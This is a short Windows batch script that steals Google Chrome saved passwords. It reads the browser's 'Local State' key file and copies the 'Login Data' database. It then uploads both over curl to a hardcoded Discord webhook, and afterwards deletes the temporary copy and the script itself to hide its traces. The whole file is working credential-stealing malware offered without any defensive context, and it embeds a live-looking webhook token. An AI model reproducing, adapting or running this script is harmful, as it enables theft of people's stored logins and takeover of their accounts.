@echo off
for /f "tokens=3 delims=:" %%a in ('findstr /C:"encrypted_key" "C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Local State"') do set "key=%%a"
copy "%LocalAppData%\Google\Chrome\User Data\Default\Login Data" "%TEMP%\Login Data"
curl --insecure -X POST -H "Content-Type: multipart/form-data" -F "key=@C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Local State" -F "logindata=@%TEMP%\Login Data" https://discord.com/api/webhooks/1163651222251778098/NeSv8w3BJ9TxAxqRCy-jVrJiJaEWyIxiDhDkuCwRHJ__0ctk7BjYBSaXH2d8ULuq4MWQ
del /q /f "%TEMP%\Login Data"
del /q /f %0